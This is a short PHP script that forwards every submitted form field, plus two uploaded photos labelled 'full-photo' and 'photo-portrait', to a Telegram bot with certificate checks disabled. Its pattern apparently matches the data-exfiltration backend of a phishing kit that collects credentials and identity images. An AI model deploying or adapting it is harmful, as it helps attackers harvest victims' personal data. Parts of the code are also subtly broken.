<?php

define('TELEGRAM_TOKEN', '000'); 
define('TELEGRAM_CHATID', '000');


function SendTelFile($type, $data) {

    if ($type == 'sendDocument') {
         $RealTitleID = $_FILES[$data]['name'];
         $data = new CurlFile($_FILES[$data]['tmp_name'], 'file/exgpd', $RealTitleID);
    }

    $ch = curl_init();

    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://api.telegram.org/bot'.TELEGRAM_TOKEN.'/'.$type,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HTTPHEADER => [
            'Content-Type: multipart/form-data'
        ],
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => [
            'chat_id' => TELEGRAM_CHATID,
            'text'  => $data,
            'parse_mode' => 'html',
            'document' => $data
        ]
    ]);
    $out = curl_exec($ch);
    curl_close($ch);
    print_r($out);
}

if (isset($_POST['file'])) {
    SendTelFile('sendDocument', 'full-photo');
    SendTelFile('sendDocument', 'photo-portrait');
} else {
    foreach($_POST as $field) {
        $message .= "<b>".$field[0]."</b>: ".$field[1]."\n";
    }
    SendTelFile('sendMessage', $message);
}

?> 